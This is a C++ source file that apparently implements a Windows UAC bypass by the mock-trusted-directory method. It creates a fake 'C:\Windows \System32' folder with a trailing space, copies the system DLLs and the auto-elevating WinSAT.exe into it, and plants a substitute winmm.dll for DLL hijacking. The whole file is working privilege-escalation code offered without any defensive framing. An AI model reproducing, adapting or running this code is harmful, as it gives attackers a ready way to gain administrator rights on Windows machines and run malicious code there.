#include "utils.hpp"

std::wstring f_windows;
std::wstring f_system32;
std::wstring system32;

std::wstring old_winsat;
std::wstring new_winsat;
std::wstring start_dll;

bool InitalizePaths() {
    f_windows = L"\\\\?\\C:\\Windows ";
    f_system32 = L"\\\\?\\C:\\Windows \\System32";
    system32 = L"C:\\Windows\\System32";

    old_winsat = system32 + L"\\WinSAT.exe";
    new_winsat = f_system32 + L"\\WinSAT.exe";

    wchar_t current_dir[MAX_PATH];

    DWORD get_cdir = GetCurrentDirectory(MAX_PATH, current_dir);

    if (get_cdir < 1 || !current_dir) {
        std::cout << "Can't get current directory.. terminating..\n";
        return false;
    }

    start_dll = std::wstring(current_dir) + L"\\winmm.dll";

    return true;
}

void CreateFakeDirectories() {
    if (!CreateDirectoryW(f_windows.c_str(), NULL)) {
        std::cerr << "mkdir 1 failed: " << GetLastError() << "\n";
    }

    if (!CreateDirectoryW(f_system32.c_str(), NULL)) {
        std::cerr << "mkdir 2 failed: " << GetLastError() << "\n";
    }

}

bool CopyDLLs() {
    HANDLE dir;
    WIN32_FIND_DATA file_data;

    if ((dir = FindFirstFile((system32 + L"/*").c_str(), &file_data)) == INVALID_HANDLE_VALUE) {
        std::cout << "No files in this dir\n";
        return false;
    }

    do {
        std::wstring file_name = file_data.cFileName;

        if (file_name == L"." || file_name == L"..") {
            continue;
        }

        if (file_name == std::wstring(L"winmm.dll") || file_name.find(L".dll") == std::wstring::npos) {
            continue;
        }

        std::wstring src_path = system32 + L"\\" + file_name;
        std::wstring dest_path = f_system32 + L"\\" + file_name;

        CopyFileW(src_path.c_str(), dest_path.c_str(), FALSE);
    } while (FindNextFile(dir, &file_data));

    FindClose(dir);

    return true;
}

bool CopyMainFiles() {
    if (!CopyFile(old_winsat.c_str(), new_winsat.c_str(), FALSE)) {
        std::cout << "Error copying WinSAT.exe\n";
        return false;
    }

    if (!CopyFile(start_dll.c_str(), L"\\\\?\\C:\\Windows \\System32\\winmm.dll", FALSE)) {
        std::cout << "Error copying fake dll. Windows Error Code: " << GetLastError() << "\n";
        return false;
    }

    return true;
}